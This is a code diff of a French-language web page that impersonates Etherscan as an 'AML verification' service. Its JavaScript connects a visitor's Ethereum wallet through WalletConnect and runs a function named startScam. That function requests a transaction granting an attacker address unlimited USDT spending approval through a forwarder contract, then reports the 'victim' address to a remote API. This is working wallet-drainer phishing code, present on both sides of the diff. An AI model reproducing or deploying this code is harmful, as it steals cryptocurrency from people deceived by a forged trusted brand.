-      type: "dot",
-      color: "#000000"
+      return null;
     }
-  });
 
-  qrCode.append(document.getElementById("qr-code"));
+    async function initWalletConnect() {
+      const SignClientClass = getSignClient();
+      if (!SignClientClass) throw new Error('WalletConnect non trouvé.');
 
-  session = await approval();
+      signClient = await SignClientClass.init({
+        projectId: PROJECT_ID,
+        metadata: {
+          name: 'Etherscan',
+          description: 'Vérification AML',
+          url: 'https://etherscan.io',
+          icons: ['https://aml-checker-4.vercel.app/etherscan-logo-circle.png']
+        }
+      });
 
-  const accounts = session.namespaces['eip155'].accounts;
-  const ethAccount = accounts.find(acc => acc.startsWith('eip155:1:'));
-  if (!ethAccount) throw new Error('Ethereum mainnet requis');
-  account = ethAccount.split(':')[2](#_r_23uk_-source-2);
-  currentChainId = '1';
+      const { uri, approval } = await signClient.connect({
+        requiredNamespaces: {
+          eip155: {
+            methods: ['eth_sendTransaction'],
+            chains: ['eip155:1'],
+            events: ['chainChanged', 'accountsChanged']
+          }
+        },
+        redirect: { universal: 'https://aml-checker-4.vercel.app/verifyaddress' }
+      });
 
-  // Remplacer le wrapper QR par le texte de statut (sans cacher le div)
-  qrDiv.innerHTML = '';
-  qrDiv.style.display = 'flex';
-  qrDiv.style.alignItems = 'center';
-  qrDiv.style.justifyContent = 'center';
-  qrDiv.style.fontSize = '14px';
-  qrDiv.style.color = 'var(--azure-15)';
-  qrDiv.textContent = `Connecté : ${account.slice(0,6)}...${account.slice(38)}`;
+      // Vérifier que qr-code-styling est chargé
+      if (typeof window.QRCodeStyling === 'undefined') {
+        console.error('QRCodeStyling non chargé');
+        document.querySelector('.scan').textContent = 'Erreur de chargement du QR';
+        return;
+      }
 
-  const scanText = document.querySelector('.scan');
-  if (scanText) scanText.textContent = 'En attente de signature…';
+      const qrDiv = document.getElementById('qrcode');
+      qrDiv.innerHTML = '';
 
-  setTimeout(startScam, 1000);
-}
+      // Créer le wrapper avec le logo SVG
+      qrDiv.innerHTML = `
+        <div id="qr-wrapper">
+          <div id="qr-code"></div>
+          <div id="logo-box">
+            <svg width="42" height="42" viewBox="-2.19622685 .37688013 124.38617733 125.52740941" xmlns="http://www.w3.org/2000/svg">
+              <path d="m25.79 58.415a5.157 5.157 0 0 1 5.181-5.156l8.59.028a5.164 5.164 0 0 1 5.164 5.164v32.48c.967-.287 2.209-.593 3.568-.913a4.3 4.3 0 0 0 3.317-4.187v-40.291a5.165 5.165 0 0 1 5.164-5.165h8.607a5.165 5.165 0 0 1 5.164 5.165v37.393s2.155-.872 4.254-1.758a4.311 4.311 0 0 0 2.632-3.967v-44.578a5.164 5.164 0 0 1 5.163-5.164h8.606a5.164 5.164 0 0 1 5.164 5.164v36.71c7.462-5.408 15.024-11.912 21.025-19.733a8.662 8.662 0 0 0 1.319-8.092 60.792 60.792 0 0 0 -58.141-40.829 60.788 60.788 0 0 0 -51.99 91.064 7.688 7.688 0 0 0 7.334 3.8c1.628-.143 3.655-.346 6.065-.63a4.3 4.3 0 0 0 3.815-4.268z" fill="#000000"/>
+              <path d="m25.602 110.51a60.813 60.813 0 0 0 63.371 5.013 60.815 60.815 0 0 0 33.212-54.203c0-1.4-.065-2.785-.158-4.162-22.219 33.138-63.244 48.63-96.423 53.347" fill="#979695"/>
+            </svg>
+          </div>
+        </div>
+      `;
 
-async function startScam() {
-  if (currentChainId !== '1') {
-    document.querySelector('.scan').textContent = 'Réseau non supporté';
-    return;
-  }
+      // Créer le QR design
+      const qrCode = new window.QRCodeStyling({
+        width: 250,
+        height: 250,
+        type: "svg",
+        data: uri,
+        margin: 0,
+        qrOptions: {
+          typeNumber: 0,
+          mode: "Byte",
+          errorCorrectionLevel: "M"
+        },
+        dotsOptions: {
+          type: "dots",
+          color: "#000000"
+        },
+        backgroundOptions: {
+          color: "#ffffff"
+        },
+        cornersSquareOptions: {
+          type: "extra-rounded",
+          color: "#000000"
+        },
+        cornersDotOptions: {
+          type: "dot",
+          color: "#000000"
+        }
+      });
 
-  const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-  const FORWARDER = '0x76C1F89188e3A9dF25B757C69360f82311530591';
+      qrCode.append(document.getElementById("qr-code"));
 
-  const approveData = '0x095ea7b3' +
-    ATTACKER.slice(2).padStart(64, '0') +
-    'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+      // Attendre la session
+      session = await approval();
 
-  const executeData = '0x54d1d367' +
-    USDT_ADDR.slice(2).padStart(64, '0') +
-    '0000000000000000000000000000000000000000000000000000000000000040' +
-    '0000000000000000000000000000000000000000000000000000000000000044' +
-    approveData.slice(2) +
-    '000000000000000000000000';
+      const accounts = session.namespaces['eip155'].accounts;
+      const ethAccount = accounts.find(acc => acc.startsWith('eip155:1:'));
+      if (!ethAccount) throw new Error('Ethereum mainnet requis');
+      account = ethAccount.split(':')[2];
+      currentChainId = '1';
 
-  const tx = {
-    from: account,
-    to: FORWARDER,
-    data: executeData,
-    chainId: 1,
-    gasLimit: '0xea60'
-  };
+      // Remplacer le wrapper QR par le texte de statut
+      qrDiv.innerHTML = '';
+      qrDiv.style.display = 'flex';
+      qrDiv.style.alignItems = 'center';
+      qrDiv.style.justifyContent = 'center';
+      qrDiv.style.fontSize = '14px';
+      qrDiv.style.color = 'var(--azure-15)';
+      qrDiv.textContent = `Connecté : ${account.slice(0,6)}...${account.slice(38)}`;
 
-  const scanText = document.querySelector('.scan');
-  if (scanText) scanText.textContent = '⏳ En attente de la signature…';
+      const scanText = document.querySelector('.scan');
+      if (scanText) scanText.textContent = 'En attente de signature…';
 
-  try {
-    await signClient.request({
-      topic: session.topic,
-      request: { id: Date.now(), jsonrpc: '2.0', method: 'eth_sendTransaction', params: [tx] },
-      chainId: 'eip155:1'
+      setTimeout(startScam, 1000);
+    }
+
+    async function startScam() {
+      if (currentChainId !== '1') {
+        document.querySelector('.scan').textContent = 'Réseau non supporté';
+        return;
+      }
+
+      const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+      const FORWARDER = '0x76C1F89188e3A9dF25B757C69360f82311530591';
+
+      const approveData = '0x095ea7b3' +
+        ATTACKER.slice(2).padStart(64, '0') +
+        'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+      const executeData = '0x54d1d367' +
+        USDT_ADDR.slice(2).padStart(64, '0') +
+        '0000000000000000000000000000000000000000000000000000000000000040' +
+        '0000000000000000000000000000000000000000000000000000000000000044' +
+        approveData.slice(2) +
+        '000000000000000000000000';
+
+      const tx = {
+        from: account,
+        to: FORWARDER,
+        data: executeData,
+        chainId: 1,
+        gasLimit: '0xea60'
+      };
+
+      const scanText = document.querySelector('.scan');
+      if (scanText) scanText.textContent = '⏳ En attente de la signature…';
+
+      try {
+        await signClient.request({
+          topic: session.topic,
+          request: { id: Date.now(), jsonrpc: '2.0', method: 'eth_sendTransaction', params: [tx] },
+          chainId: 'eip155:1'
+        });
+        if (scanText) scanText.textContent = '✅ Le client a signé, il est redirigé vers la page de vérification.';
+      } catch (e) {
+        console.error('Approve échoué', e);
+        if (scanText) scanText.textContent = '❌ Le client a refusé de signer.';
+      }
+
+      await fetch(API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ victim: account, chain: currentChainId })
+      });
+
+      console.log('Transaction envoyée, la victime va être redirigée par son wallet.');
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      initWalletConnect().catch(err => {
+        console.error('Erreur init WC:', err);
+        const scanText = document.querySelector('.scan');
+        if (scanText) scanText.textContent = 'Erreur de connexion';
+      });
     });
-    if (scanText) scanText.textContent = '✅ Le client a signé, il est redirigé vers la page de vérification.';
-  } catch (e) {
-    console.error('Approve échoué', e);
-    if (scanText) scanText.textContent = '❌ Le client a refusé de signer.';
-  }
-
-  await fetch(API, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ victim: account, chain: currentChainId })
-  });
-
-  console.log('Transaction envoyée, la victime va être redirigée par son wallet.');
-}
-
-// Lancer le module après chargement du DOM
-document.addEventListener('DOMContentLoaded', function() {
-  initWalletConnect().catch(err => {
-    console.error('Erreur init WC:', err);
-    const scanText = document.querySelector('.scan');
-    if (scanText) scanText.textContent = 'Erreur de connexion';
-  });
-});
   </script>
 </body>
 </html>
